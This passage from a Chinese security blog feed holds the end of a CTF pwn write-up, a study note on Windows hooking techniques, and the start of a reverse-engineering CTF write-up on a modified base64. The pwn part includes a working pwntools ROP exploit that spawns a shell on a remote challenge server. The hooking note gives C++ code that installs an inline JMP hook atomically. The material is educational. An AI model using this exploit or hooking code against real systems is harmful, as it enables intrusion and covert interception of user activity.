src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234015.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234057.png" alt></p><ul><li>把这个Line prefixes(graph) 前面的勾打上就能显示地址了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234121.png" alt></p><ul><li><p>这样得到了<code>system</code>函数的地址为<code>0x000000000040075A</code></p></li><li><p>根据之前的思路, 我们通过覆盖程序的返回地址来让程序跳转到我们想让它跳到的地方。但是,只调到<code>system</code>函数是不够的,因为我们还没有把<code>/bin/sh</code>这个参数给它传进去。(调用函数前需要先传入参数)</p></li><li><p>所以现在需要先把参数传进去。</p></li></ul><blockquote><p>64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p></blockquote><ul><li>我们的参数只有一个,所以是用rdi来传参的。</li></ul><h2 id="小难点"><a href="#小难点" class="headerlink" title="小难点"></a>小难点</h2><ul><li><p>以下内容可能会有些迷,别急,后续会有详细的调试以及讲解。</p></li><li><p>我们需要将参数pop到rdi中,因此我们需要调用<code>pop rdi;ret</code>所以我们去找这条命令的地址。</p></li><li><p>关于为什么是<code>pop rdi;ret</code> 而不只是<code>pop rdi</code>,后续也会有讲解。</p></li><li><p>可以利用<code>ROPgadget</code>工具进行查找。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804235517.png" alt></p><ul><li>这样我们得到了<code>pop rdi;ret</code>的地址<code>0x00000000004007d3</code>。</li></ul><h1 id="0x02拿Flag"><a href="#0x02拿Flag" class="headerlink" title="0x02拿Flag"></a>0x02拿Flag</h1><ul><li>先给出脚本,运行脚本前需要安装pwntools:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004007d3</span> </span><br><span class="line">bin_sh = <span class="number">0x000000000060111f</span></span><br><span class="line">system = <span class="number">0x000000000040075A</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">0x10</span> <span class="comment">#这0x10个是用来覆盖那0x10字节的栈空间的。</span></span><br><span class="line">payload += <span class="string">'A'</span>*<span class="number">0x8</span> <span class="comment">#这0x8是覆盖RBP的,因为是64位程序,RBP大小为0x8</span></span><br><span class="line">payload += p64(pop_rdi_ret) <span class="comment">#64位程序用p64,这三行为什么是这个顺序,待会会有讲解。</span></span><br><span class="line">payload += p64(bin_sh) </span><br><span class="line">payload += p64(system)  </span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Come on,try to pwn me'</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><ul><li>运行即可拿到flag</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805000402.png" alt></p><h1 id="0x03调试与分析"><a href="#0x03调试与分析" class="headerlink" title="0x03调试与分析"></a>0x03调试与分析</h1><ul><li>通过IDA server来调试一下程序。(这个具体怎么操作,百度就行,有很详细的教程)</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805000931.png" alt></p><ul><li>在大佬的指导下写了另一个用来调试的脚本<code>exp.py</code>。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001027.png" alt></p><ul><li><p>运行<code>linux_server64</code> 同时 运行<code>exp</code></p></li><li><p>在IDA选择<code>Remote Linux debugger</code>,然后选择<code>Attach to process...</code></p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001155.png" alt></p><ul><li>然后<code>Ctrl+F</code>搜索 pwn4</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001350.png" alt></p><ul><li><p>选中点击确定即可调试。</p></li><li><p>在<code>read</code>后的一句下断点。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001612.png" alt></p><ul><li><p>也就是图中紫色这一句。 然后F8单步</p></li><li><p>在栈窗口能看到我们的payload已经传入了。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805001710.png" alt></p><h2 id="第1点"><a href="#第1点" class="headerlink" title="第1点"></a>第1点</h2><ul><li>那两行414141…就是’A’*0x10</li></ul><h2 id="第2点"><a href="#第2点" class="headerlink" title="第2点"></a>第2点</h2><ul><li>那一行616161…就是’a’*0x8,这里是<code>RBP</code>所在的地方(现在依然也是RBP所在的地方,只不过内容变了),现在被这一串61覆盖了。</li></ul><h2 id="第3点"><a href="#第3点" class="headerlink" title="第3点"></a>第3点</h2><ul><li>而<code>0x00000000004007D3</code>所在位置,曾经是<code>原本程序的返回地址</code>,现在这个位置依然是<code>返回地址</code>,不过变成<code>pop rdi;ret</code>的地址了, 也就是说程序会返回到<code>pop rdi;ret</code>的地址执行<code>pop rdi;ret</code>,而不会按程序原本的逻辑来执行了。</li></ul><h2 id="第4点"><a href="#第4点" class="headerlink" title="第4点"></a>第4点</h2><ul><li><code>0x000000000060111F</code>就是<code>$0</code>即<code>/bin/sh</code>的地址了。</li></ul><h2 id="第5点"><a href="#第5点" class="headerlink" title="第5点"></a>第5点</h2><ul><li><code>0x000000000040075A</code>即<code>system函数的地址</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805003032.png" alt></p><ul><li><p>单步来到这,是一个<code>leave</code>指令,这个指令等价于<code>mov rsp,rbp</code> ，<code>pop rbp</code></p></li><li><p>执行前,栈和寄存器的状态是这样的,注意观察<code>RSP</code>,<code>RBP</code>。</p></li><li><p>栈窗口中深色的那一行即为RSP目前指向的位置。<br><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805003257.png" alt></p></li><li><p>执行后是这样的。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805003417.png" alt></p><ul><li>这说明了上述第2点和第3点。</li></ul><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><ul><li><p>我在分析的时候产生了这样的疑惑。</p></li><li><p><code>leave</code>相当于<code>mov rsp,rbp</code> ，<code>pop rbp</code></p></li><li><p>那<code>mov rsp,rbp</code>以后 rsp应该指向<code>61616161...</code>那一行啊,为什么现在却指向了<code>61616161...</code>下面的那一行?</p></li><li><p>请教大佬后得知,这是因为<code>pop rbp</code>相当于<code>mov rbp,[rsp]</code>,<code>add rsp,0x8</code></p></li><li><p>32位的话就是<code>add esp,0x4</code></p></li><li><p>这样就导致了rsp指向了现在它所指的位置。</p></li><li><p>接下来就要执行<code>retn</code>指令了。</p></li><li><p><code>retn</code>，等价于<code>pop rip</code></p></li><li><p><code>rip</code>存放的是下一条指令的地址。</p></li><li><p><code>pop rip</code>就相当于把<code>rsp指向的东西</code>传入到<code>rip</code>中,现在<code>rsp</code>指向的是我们传进去的<code>pop rdi;ret</code>的地址, 所以这样就能让<code>rip</code>里存的是<code>pop rdi;ret</code>的地址,所以执行完<code>retn</code>后就会执行<code>pop rdi;ret</code>。</p></li><li><p>F8单步运行,<code>rip</code> 如我们所愿变成了<code>pop rdi;ret</code>的地址, 左侧窗口也变成了<code>pop rdi</code>的位置,<code>rsp</code>指向了<code>$0</code>即<code>/bin/sh</code>所在的地方。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805004826.png" alt></p><ul><li><p>接着单步运行的话, 会执行<code>pop rdi</code>指令,就能将<code>rsp</code>现在所指的<code>/bin/sh</code>传入到<code>rdi</code>中,用<code>rdi</code>来为<code>system函数</code>进行传参。</p></li><li><p>继续F8单步运行。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805005107.png" alt></p><ul><li><p>如我们所愿。左侧来到了<code>retn</code>的位置,现在来讲一下前面留下来的问题:“当时找的为什么是<code>pop rdi;ret</code> 而不只是<code>pop rdi</code>”</p></li><li><p>假设我们用的<code>pop rdi</code>,确实能够将<code>/bin/sh</code>传入到<code>rdi</code>中,但是我们就没办法执行<code>system函数</code>了,因为如果用<code>pop rdi</code>的话,执行完<code>pop rdi</code>以后就没有指令能将<code>rip</code>执行<code>system函数</code>的地址了。</p></li><li><p>为了更好地说明问题,再观察一下现在的栈及寄存器的情况。</p></li><li><p><code>rsp</code>指向了<code>system函数</code>的地址, <code>rip</code>中存的是<code>retn</code>指令的地址,下一步就会执行<code>retn</code>,执行完以后<code>rip</code>里存的就是<code>system函数</code>的地址了,然后就能执行<code>system函数</code>了。</p></li><li><p>继续F8单步运行。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805005804.png" alt></p><ul><li>如我们所愿,<code>rip</code>指向了<code>system函数</code>的地址,<code>rdi</code>里存的是<code>/bin/sh</code>这样就能调用<code>system函数</code>了,就能得到shell了。</li></ul><h1 id="0x04写在最后"><a href="#0x04写在最后" class="headerlink" title="0x04写在最后"></a>0x04写在最后</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/23481.jpg" alt></p><ul><li>我新接触pwn,还在慢慢爬坑,很用心地写了这篇文章来帮助同样在爬坑的人学习pwn,如果有什么地方有不足之处,希望大佬们能帮我指出。</li></ul>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>HOOK技术学习笔记</title>
    <url>/2022/04/12/HOOK%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/97547828_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>再来系统学习一下之前学的不扎实的HOOK技术:cry:</p><p>HOOK技术，用好了能有很奇妙的效果哟~</p><p>可以对程序的执行流进行监控、拦截。举个例子：键盘钩子，可以监控用户通过键盘输入了什么:happy:</p><h1 id="0x01-HOOK的几种分类"><a href="#0x01-HOOK的几种分类" class="headerlink" title="0x01 HOOK的几种分类"></a>0x01 HOOK的几种分类</h1><p>HOOK技术可以分为<code>Inline Hook</code>、<code>Address Hook</code>、<code>基于异常处理的Hook</code>、<code>不是HOOK的HOOK</code>等</p><h2 id="1-Inline-Hook"><a href="#1-Inline-Hook" class="headerlink" title="1. Inline Hook"></a>1. Inline Hook</h2><p>Inline Hook是指直接修改指令的Hook，其关键是转移程序的执行流程，一般用jmp、call、retn等转移指令</p><h3 id="几种常见形式"><a href="#几种常见形式" class="headerlink" title="几种常见形式"></a>几种常见形式</h3><ol><li>jmp xxxxxxxx(5字节)</li><li>push xxxxxxxx / retn(6字节)</li><li>mov eax,xxxxxxxx / jmp eax(7字节)</li><li>call Hook</li><li>HotPatch Hook</li></ol><h2 id="2-Address-Hook"><a href="#2-Address-Hook" class="headerlink" title="2. Address Hook"></a>2. Address Hook</h2><p>Address Hook是指通过修改数据来进行Hook，这些数据往往是一些函数的地址或者偏移量，它们通常存放在某类数据结构中或是指定位置处，也可能是存在于寄存器中。它们有一个共同点，就是会在某时刻成为执行过程中的eip，因此将这数据替换成我们想要的函数地址就实现了Hook</p><h3 id="几种常见形式-1"><a href="#几种常见形式-1" class="headerlink" title="几种常见形式"></a>几种常见形式</h3><ol><li>IAT(Import Address Table,输入表)</li><li>EAT(Export Address Table,输出表)</li><li>user32.dll的回调函数表</li><li>IDT(Interrupt Descriptor Table,系统的中断描述符表)</li><li>SSDT和Shadow SSDT</li><li>C++类的虚函数表</li><li>COM接口的功能函数表</li><li>特殊寄存器中的地址</li><li>特定的函数指针</li></ol><h2 id="3-基于异常处理的Hook"><a href="#3-基于异常处理的Hook" class="headerlink" title="3. 基于异常处理的Hook"></a>3. 基于异常处理的Hook</h2><p>在程序中自行安装SEH，向被HOOK的位置写入一条会引发异常的指令，只要程序执行到这里就会触发异常，从而跳转到事先安装的异常处理程序处。</p><h2 id="4-不是HOOK的HOOK"><a href="#4-不是HOOK的HOOK" class="headerlink" title="4. 不是HOOK的HOOK"></a>4. 不是HOOK的HOOK</h2><p>回顾病毒和操作系统的一些行为，都是在某些时候取得程序的控制权，并进行适当的处理。</p><h3 id="几种常见的形式"><a href="#几种常见的形式" class="headerlink" title="几种常见的形式"></a>几种常见的形式</h3><ol><li><p>PE被感染，修改EnterPoint</p><p>会在执行完病毒代码后跳回正常的程序入口，使其不易被察觉。</p></li><li><p>系统回调机制</p></li><li><p>分层服务和过滤驱动模型</p></li></ol><h1 id="0x02-几个细节"><a href="#0x02-几个细节" class="headerlink" title="0x02 几个细节"></a>0x02 几个细节</h1><h2 id="1-裸函数-naked"><a href="#1-裸函数-naked" class="headerlink" title="1. 裸函数 naked"></a>1. 裸函数 naked</h2><p>__declspec(naked) 告诉编译器，以下的汇编不需要编译器再优化什么指令。</p><h2 id="2-系统位数引起的细节问题"><a href="#2-系统位数引起的细节问题" class="headerlink" title="2. 系统位数引起的细节问题"></a>2. 系统位数引起的细节问题</h2><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>指针在x86上4字节，在x64上8字节。</p><p>可以使用<code>ULONG_PTR</code>来自适应于编译器，类似的还有<code>SIZE_T</code></p><h3 id="内存地址对齐"><a href="#内存地址对齐" class="headerlink" title="内存地址对齐"></a>内存地址对齐</h3><p>x64最好按照16字节来对齐，尽管x64对应8字节</p><h3 id="PE格式"><a href="#PE格式" class="headerlink" title="PE格式"></a>PE格式</h3><p>影响依照PE结构的HOOK</p><h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>x64仅有<code>__fastcall</code>调用方式</p><p>用寄存器来传参</p><p>第1~4个整型参数依次按照<code>RCX、RDX、R8、R9</code>来传参</p><p>第1~4个浮点参数依次按照<code>XMM0、XMM1、XMM2、XMM3</code>来传参</p><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><p>对于直接跳转指令<code>E9</code>，跳转范围以当前位置为界，前后各2GB，在X86平台完全够用，但是在X64平台就不够了。</p><p>所以在64位的情况下，jmp必须直接包含目标地址</p><p>可以用</p><p><code>mov rax,addr / jmp rax</code></p><p><code>push ret</code></p><p><code>jmp [addr]</code>其中此jmp为<code>FF25</code>且<code>Address = eip + 偏移量 + 6(指令长度)</code></p><h3 id="PatchGuard"><a href="#PatchGuard" class="headerlink" title="PatchGuard"></a>PatchGuard</h3><h2 id="3-一个经典的问题"><a href="#3-一个经典的问题" class="headerlink" title="3. 一个经典的问题"></a>3. 一个经典的问题</h2><p>我们该如何保证HOOK的原子性？</p><p>即，我们如何保证负责HOOK的线程在进行HOOK的时候，其他线程不会访问被HOOK但还没完成HOOK的代码段？</p><p>这里提出几种解决方案，这几种解决方案均是受启发于《Windows核心编程》这本经典著作。</p><h3 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h3><p>我们可以在执行HOOK的时候，挂起(Suspend)其他一切无关的线程，在HOOK完毕后再恢复(Resume)其他线程</p><p>相关代码如下：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">Solution1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">	THREADENTRY32 stThreadEntry32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	stThreadEntry32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line">	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, GetCurrentProcessId());</span><br><span class="line">	Thread32First(hSnapshot, &amp;stThreadEntry32);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (stThreadEntry32.th32ThreadID != GetCurrentThreadId()) &#123;</span><br><span class="line">			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, stThreadEntry32.th32ThreadID);</span><br><span class="line">			<span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">				SuspendThread(hThread);</span><br><span class="line">				CloseHandle(hThread);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (TRUE == Thread32Next(hSnapshot, &amp;stThreadEntry32));</span><br><span class="line">	CloseHandle(hSnapshot);</span><br><span class="line">	<span class="comment">//至此 其他线程全部挂起，下面可以进行HOOK</span></span><br><span class="line">	<span class="comment">//....HOOK</span></span><br><span class="line">	<span class="comment">//HOOK完毕后恢复线程</span></span><br><span class="line">	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, GetCurrentProcessId());</span><br><span class="line">	Thread32First(hSnapshot, &amp;stThreadEntry32);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (stThreadEntry32.th32ThreadID != GetCurrentThreadId()) &#123;</span><br><span class="line">			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, stThreadEntry32.th32ThreadID);</span><br><span class="line">			<span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">				ResumeThread(hThread);</span><br><span class="line">				CloseHandle(hThread);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (TRUE == Thread32Next(hSnapshot, &amp;stThreadEntry32));</span><br><span class="line">	CloseHandle(hSnapshot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h3><p>我们可以借助Windows提供的具有原子性的API，例如</p><p><code>InterlockedExchange</code>系列与<code>InterlockedCompareExchange</code>系列</p><p>但是值得注意的是，这两个系列均仅支持修改1/2/4/8字节，并不支持修改其他字节，是的，我并没有找到直接修改HOOK所需的5或者7字节的API，但是这并不妨碍我们进行修改，例如我们的Inline Hook往往是需要修改5或者7字节，这都小于8字节，因此我们可以调用<code>InterlockedExchange64</code>来直接修改8字节！</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Solution2_Install</span><span class="params">(DWORD originalCodeAddr, DWORD originalSize, DWORD newCodeAddr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (originalCodeAddr == <span class="number">0</span> || originalSize &lt; <span class="number">5</span> || originalSize &gt; <span class="number">8</span> || newCodeAddr == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 设置内存写权限</span></span><br><span class="line">	DWORD dwOldProtectFlag;</span><br><span class="line">	BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 计算E9 JMP后面的4字节 = 要跳转的地址 - CALL的下一条指令的地址</span></span><br><span class="line">	DWORD dwJmpCode = newCodeAddr - (originalCodeAddr + <span class="number">5</span>);</span><br><span class="line">	<span class="comment">// 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节</span></span><br><span class="line">	BYTE bReplace[<span class="number">8</span>] = &#123; <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;<span class="comment">//全部用NOP替换</span></span><br><span class="line">	bReplace[<span class="number">0</span>] = <span class="number">0xE9</span>; <span class="comment">// JMP</span></span><br><span class="line"></span><br><span class="line">	*(PDWORD)(&amp;(bReplace[<span class="number">1</span>])) = dwJmpCode;<span class="comment">//☆体会这种语句的好处</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓</span></span><br><span class="line">	<span class="built_in">memcpy</span>( (BYTE*)(bReplace + originalSize),</span><br><span class="line">		(LPVOID)(originalCodeAddr + originalSize), <span class="number">8</span> - originalSize);<span class="comment">//把后面字节copy过来</span></span><br><span class="line"></span><br><span class="line">	LONG64 llReplace;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;llReplace, bReplace, <span class="number">8</span>);<span class="comment">//全都copy给一个64位的变量</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 原子操作hook</span></span><br><span class="line">	InterlockedExchange64((LONG64 <span class="keyword">volatile</span>*)originalCodeAddr, llReplace);</span><br><span class="line">	<span class="comment">// 恢复内存属性</span></span><br><span class="line">	VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, dwOldProtectFlag, &amp;dwOldProtectFlag);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Solution2_Uninstall</span><span class="params">(DWORD originalCodeAddr, DWORD originalSize, BYTE * oldCodeAddr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (originalCodeAddr == <span class="number">0</span> || originalSize &lt; <span class="number">5</span> || originalSize &gt; <span class="number">8</span> || oldCodeAddr == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置内存写权限</span></span><br><span class="line">	DWORD dwOldProtectFlag;</span><br><span class="line">	BOOL bRet = VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtectFlag);</span><br><span class="line">	<span class="keyword">if</span> (!bRet)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 由于要使用InterlockedExchange64来修改8字节，故构造替换的8字节</span></span><br><span class="line">	BYTE bReplace[<span class="number">8</span>] = &#123; <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span> &#125;;<span class="comment">//全部用NOP替换</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//这里以及下面的memcpy无伤大雅，这块只是准备工作，即便不能够线程安全也无所谓</span></span><br><span class="line">	<span class="built_in">memcpy</span>((BYTE*)bReplace, (LPVOID)(oldCodeAddr), originalSize);<span class="comment">//还原原始的</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>((BYTE*)(bReplace + originalSize),</span><br><span class="line">		(LPVOID)(originalCodeAddr + originalSize), <span class="number">8</span> - originalSize);<span class="comment">//把后面字节copy过来</span></span><br><span class="line"></span><br><span class="line">	LONG64 llReplace;</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;llReplace, bReplace, <span class="number">8</span>);<span class="comment">//全都copy给一个64位的变量</span></span><br><span class="line">	<span class="comment">// 原子操作hook</span></span><br><span class="line">	InterlockedExchange64((LONG64 <span class="keyword">volatile</span>*)originalCodeAddr, llReplace);</span><br><span class="line">	<span class="comment">// 恢复内存属性</span></span><br><span class="line">	VirtualProtect((LPVOID)originalCodeAddr, <span class="number">8</span>, dwOldProtectFlag, &amp;dwOldProtectFlag);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方案三"><a href="#方案三" class="headerlink" title="方案三"></a>方案三</h3><p>借助信号量机制。</p><p>首先，我们进行修改内存的时候极有可能使用<code>memcpy</code>这个函数，而这个函数并不是线程安全函数，引用自StackOverflow</p><blockquote><p>memcpy is typically coded for raw speed. It will not be thread safe. If you require this, you need to perform the memcpy call inside of a critical section or use some other semaphor mechanism.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt; take_mutex(&amp;mutex);</span><br><span class="line">&gt; <span class="built_in">memcpy</span>(dst, src, count);</span><br><span class="line">&gt; yield_mutex(&amp;mutex);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h1 id="0x03-HOOK实例"><a href="#0x03-HOOK实例" class="headerlink" title="0x03 HOOK实例"></a>0x03 HOOK实例</h1><h1 id="0x04-HOOK的应用"><a href="#0x04-HOOK的应用" class="headerlink" title="0x04 HOOK的应用"></a>0x04 HOOK的应用</h1><h2 id="1-实现增强的二次开发和补丁"><a href="#1-实现增强的二次开发和补丁" class="headerlink" title="1. 实现增强的二次开发和补丁"></a>1. 实现增强的二次开发和补丁</h2><p>自行编写DLL实现新功能，并设法使目标进程加载这个补丁DLL，在补丁DLL中将原功能函数HOOK到DLL中对应的功能函数处。</p><h2 id="2-信息截获"><a href="#2-信息截获" class="headerlink" title="2. 信息截获"></a>2. 信息截获</h2><h2 id="3-安全防护"><a href="#3-安全防护" class="headerlink" title="3. 安全防护"></a>3. 安全防护</h2><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p>《加密与解密》第四版Hook相关章节</p><p><a href="https://blog.csdn.net/qq_31507523/article/details/92800468?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-92800468-blog-7269486.pc_relevant_antiscanv3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-92800468-blog-7269486.pc_relevant_antiscanv3&utm_relevant_index=2" target="_blank" rel="noopener">多线程inline hook</a></p><p><a href="https://blog.csdn.net/Kwansy/article/details/108549163?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-108549163-blog-7269486.pc_relevant_antiscanv3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-2-108549163-blog-7269486.pc_relevant_antiscanv3&utm_relevant_index=5" target="_blank" rel="noopener">多线程inline hook</a></p><p><a href="https://blog.51cto.com/u_15127640/4356145?b=totalstatistic" target="_blank" rel="noopener">inline hook需要注意的问题</a></p><p><a href="https://stackoverflow.com/questions/15145152/is-memcpy-process-safe" target="_blank" rel="noopener">memcpy是否线程安全</a></p>]]></content>
      <categories>
        <category>随手小记</category>
      </categories>
  </entry>
  <entry>
    <title>Base64_changed(一道比赛逆向题)</title>
    <url>/2020/11/24/Base64-changed-%E4%B8%80%E9%81%93%E6%AF%94%E8%B5%9B%E9%80%86%E5%90%91%E9%A2%98/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/84376515_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>被老师安排带着20级的学弟去了聊城市的”第三届山东新一代信息技术创新应用大赛–信息安全攻防赛项”</p><p>做题时，我各个题目时间分配不太合理…或许我应该先帮忙把杂项做完，而不是一直在纠结这个逆向题以及pwn的libc问题…痛失一等奖</p><p>pwn没给libc，用libcsearcher也不管用，导致远程一直没打通，但是事后询问了一位师傅，他直接大胆猜测libc就是2.23的…也确实打通了…看来我还是缺少经验555</p><p>逆向一共3个，前俩没啥亮点，但是第三个挺难搞，虽然分值还没re2高</p><p>赛后趁没课赶紧复现了一下。</p><p>题目附件: <a href="https://github.com/LiuL14n/CTF/blob/main/LC/Base64_changed.zip" target="_blank" rel="noopener">下载地址</a></p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><p>程序<code>Base64_changed.exe</code>未加任何壳，直接拖入IDA分析。</p><p>来到<code>main</code>函数,其中有一部分符号我已经重命名了。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201124173036.png" alt></p><p>从main函数来看，程序逻辑非常简单，先进行输入，然后对输入进行一次<code>changed_base64_encode</code>然后再对其结果进行一次<code>GetIndexString</code>操作。</p><p>具体分析一下:</p><h2 id="changed-base64-encode"><a href="#changed-base64-encode" class="headerlink" title="changed_base64_encode"></a>changed_base64_encode</h2><p>起初我并没有对这个函数进行细看，只以为这个函数只是单纯的进行了换了表的base64_encode。</p><p>但赛后复现的时候却发现了很关键的一处!</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20201124173523.png" alt></p><p>这里有个<code>+14</code>，即对索引加了14</p><p>那么为了使我们现有的<code>base64_decode</code>算法能正常运行(或者去直接修改base64_decode算法，但这样比较麻烦)</p><p><strong>需要手动将<code>changed_base64_table</code>进行了一次整体左移14位!</strong></p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">.rdata:<span 